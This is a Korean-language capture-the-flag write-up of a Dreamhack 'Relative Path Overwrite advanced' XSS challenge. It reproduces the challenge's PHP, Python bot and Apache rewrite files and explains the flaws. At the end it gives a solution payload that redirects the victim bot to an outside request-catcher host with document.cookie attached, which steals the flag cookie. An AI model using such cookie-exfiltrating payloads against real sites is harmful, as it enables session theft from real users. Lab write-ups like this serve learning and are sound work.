---
title: "[2025-08-17] RPO advanced"
excerpt: "RPO advanced"

categories:
  - Problem
tags:
  - [XSS, RPO]

permalink: /Problem/[2025-08-17] RPO advanced/

toc: true
toc_sticky: true

date: 2025-08-17
last_modified_at: 2025-08-17
---

## 🦥 본문

- bot.py
    
    ```python
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    import sys
    import base64
    
    if len(sys.argv) < 2:
        exit(-1)
    
    if len(sys.argv[1]) == 0:
        exit(-1)
    
    path = base64.b64decode(sys.argv[1]).decode('latin-1')
    
    try:
        FLAG = open('/flag.txt', 'r').read()
    except:
        FLAG = '[**FLAG**]'
    
    def read_url(url, cookie={'name': 'name', 'value': 'value'}):
        cookie.update({'domain':'127.0.0.1'})
        try:
            service = Service(executable_path="/chromedriver")
            options = webdriver.ChromeOptions()
            for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
                options.add_argument(_)
            driver = webdriver.Chrome(service=service, options=options)
            driver.implicitly_wait(3)
            driver.set_page_load_timeout(3)
            driver.get('http://127.0.0.1/')
            driver.add_cookie(cookie)
            driver.get(url)
    
        except Exception as e:
            driver.quit()
            return False
        driver.quit()
        return True
    
    def check_xss(path, cookie={'name': 'name', 'value': 'value'}):
        url = f'http://127.0.0.1/{path}'
        return read_url(url, cookie)
    
    if not check_xss(path, {'name': 'flag', 'value': FLAG.strip()}):
        print('<script>alert("wrong??");history.go(-1);</script>')
    else:
        print('<script>alert("good");history.go(-1);</script>')
    
    ```
    
    - `check_xss()` 에서 쿠키에 flag를 집어 넣고 `read_url()`을 통해 웹드라이버로 실행
- index.php
    
    ```php
    <html>
    <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
    <title>Relative-Path-Overwrite-Advanced</title>
    </head>
    <body>
        <!-- Fixed navbar -->
        <nav class="navbar navbar-default navbar-fixed-top">
          <div class="container">
            <div class="navbar-header">
              <a class="navbar-brand" href="/">Relative-Path-Overwrite-Advanced</a>
            </div>
            <div id="navbar">
              <ul class="nav navbar-nav">
                <li><a href="/">Home</a></li>
                <li><a href="/?page=vuln&param=dreamhack">Vuln page</a></li>
                <li><a href="/?page=report">Report</a></li>
              </ul>
    
            </div><!--/.nav-collapse -->
          </div>
        </nav><br/><br/><br/>
        <div class="container">
        <?php
              $page = $_GET['page'] ? $_GET['page'].'.php' : 'main.php';
              if (!strpos($page, "..") && !strpos($page, ":") && !strpos($page, "/"))
                  include $page;
          ?>
        </div>
    </body>
    </html>
    ```
    
    - page 파라미터를 통해 `.php` 파일 실행. 이 때 `..`이나 `:`이나 `/`는 필터링
- report.php
    
    ```php
    <?php
    if(isset($_POST['path'])){
        exec(escapeshellcmd("python3 /bot.py " . escapeshellarg(base64_encode($_POST['path']))) . " 2>/dev/null &", $output);
        echo($output[0]);
    }
    ?>
    
    <form method="POST" class="form-inline">
        <div class="form-group">
            <label class="sr-only" for="path">/</label>
            <div class="input-group">
                <div class="input-group-addon">http://127.0.0.1/</div>
                <input type="text" class="form-control" id="path" name="path" placeholder="/">
            </div>
        </div>
        <button type="submit" class="btn btn-primary">Report</button>
    </form>
    ```
    
    - 아래와 같은 코드 실행
        
        ```php
        python3 /bot.py <Base64로 인코딩된 path> 2>/dev/null &
        ```
        
        - 이 때 escape를 사용하여 CLI Injection 피함
        - `2>/dev/null` : 에러 출력은 전부 무시
        - `&` : 백그라운드 실행
- vuln.php
    
    ```
    <script src="filter.js"></script>
    <pre id=param></pre>
    <script>
        var param_elem = document.getElementById("param");
        var url = new URL(window.location.href);
        var param = url.searchParams.get("param");
        if (typeof filter === 'undefined') {
            param = "nope !!";
        }
        else {
            for (var i = 0; i < filter.length; i++) {
                if (param.toLowerCase().includes(filter[i])) {
                    param = "nope !!";
                    break;
                }
            }
        }
    
        param_elem.innerHTML = param;
    </script>
    
    ```
    
    - 현재 URL의 param 값을 가져와서 필터링 후 `<pre>` 태그에 집어 넣음
    - filter.js가 상대 주소로 되어 있어서 필터링을 수행 안 시킬 수 있음
- 404.php
    
    ```php
    <?php 
        header("HTTP/1.1 200 OK");
        echo $_SERVER["REQUEST_URI"] . " not found."; 
    ?>
    ```
    
    - `header("HTTP/1.1 200 OK");` : 응답 코드 200으로 지정
    - 요청한 URL 경로가 not found임을 나타내는 페이지
- 000-default.conf
    
    ```php
    RewriteEngine on
    RewriteRule ^/(.*)\.(js|css)$ /static/$1 [L]
    
    ErrorDocument 404 /404.php
    ```
    
    - URL Rewrite 지정하는 코드
        - `.js` 나 `.css` 파일명은 `/static` 경로에서 요청하도록 rewrite
        - `[L]` : 이 규칙이 매칭되면 다른 RewriteRule 적용 X
        - RewriteRule은 스크립트의 파일 요청에서도 적용되므로 `<script src=filter.js>`에도 적용
    - `ErrorDocument 404` : 404 Not Found 에러가 발생했을 때 `/404.php` 실행

기존의 RPO 문제에서 rewrite rule과 404 페이지가 추가되었다. 

그래서 일부로 404를 유발하고 CSS Injection과 연계하여 드림핵 툴즈에 쿠키를 넣어서 보내는 것을 생각했다.

```php
index.php/page=evil.css/*{background:url(https://zcpzeje.request.dreamhack.games)}
```

근데 CSS injection을 실행시키려면 css로 읽어들여야 하는데 `<link rel>` 태그로만 가능하단다..

공격하려면 일단 웹드라이버로 들어가야 함

쿠키는 외부에서 요청해야 함

즉, js 코드를 실행해야 함 → 404.php 혹은 vuln.php

- vuln.php에서는 filter.js가 문제. 상대 경로이지만 default 값에 의해 static 내부 폴더에 있는 것만 작동
- JS와의 연계 부분에서
    1. `/static/script.js` 로 로드되어야 할 파일을 `/USER_INPUT/static/script.js` 의 형태로 로드할 수 있는 경우
    2. `USER_INPUT` 부분을 조작하여 `index.php/alert(1);` 코드를 넣음
    3. 최종 경로는 `/index.php/;alert(1);//static/script.js`로 처리
    4. 브라우저는 JS로 인식하고 `/index.php` 를 실행 → HTML 반환
    5. alert(1); 부분은 JS 코드로 실행. 뒤 `//static/script.js` 는 주석 처리되어 무시

를 이용하려고 

```php
index.php/alert(1);//?page=vuln
```

를 먼저 해봤는데 alert(1)가 안뜬다. 근데 ;alert(1);는 됨? → 왜?

`/index.php/`를 정규식 리터럴로 받아드리고 `;`를 해야 정규식 문장이 끝임을 알리고 `alert(1);`을 해야 동작한다

### 풀이 과정

1. 아래와 같은 코드를 `/report` API에 입력

```php
index.php/;location.href='https://hyfimog.request.dreamhack.games/'+document.cookie;//?page=vuln&param=dreamhack
```